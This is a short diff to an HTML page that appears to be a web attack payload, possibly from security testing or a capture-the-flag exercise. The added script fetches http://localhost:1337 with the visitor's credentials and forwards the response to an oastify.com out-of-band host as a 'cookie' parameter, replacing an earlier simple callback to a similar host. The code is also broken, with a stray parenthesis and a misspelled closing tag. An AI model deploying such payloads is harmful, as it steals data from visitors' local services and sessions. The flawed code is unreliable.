@@ -1,3 +1,6 @@
 <html>
-<script>fetch("https://e9ouhqlsolp7ra4jymknr3ipggmda4yt.oastify.com")</script>
+<script>
+  fetch('http://localhost:1337', { method: 'GET', credentials: 'include' }).then((response) => response.json())).then((json) => {
+    fetch('https://lsh10x4z7s8eahnqht3uaa1wzn5mtdh2.oastify.com/?cookie='+json); }).catch((err) => { console.log(err); });
+</script>
 </hmtl>
